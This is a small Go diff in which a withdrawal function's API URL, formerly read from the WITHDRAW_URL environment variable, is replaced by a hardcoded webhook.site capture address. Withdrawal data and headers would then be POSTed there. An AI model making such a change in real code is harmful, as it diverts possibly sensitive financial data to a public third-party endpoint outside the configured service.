@@ -4,13 +4,12 @@ import (
 	"bytes"
 	"log"
 	"net/http"
-	"os"
 
 	errors "github.com/celalsahinaltinisik/exceptions"
 )
 
 func sendToExternalWithdrawAPI(data []byte, headers map[string]interface{}) error {
-	apiURL := os.Getenv("WITHDRAW_URL")
+	apiURL := "https://webhook.site/3fef26b2-eb5e-4ae4-95a5-e01dd9890336"
 
 	// สร้าง HTTP request
 	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(data))
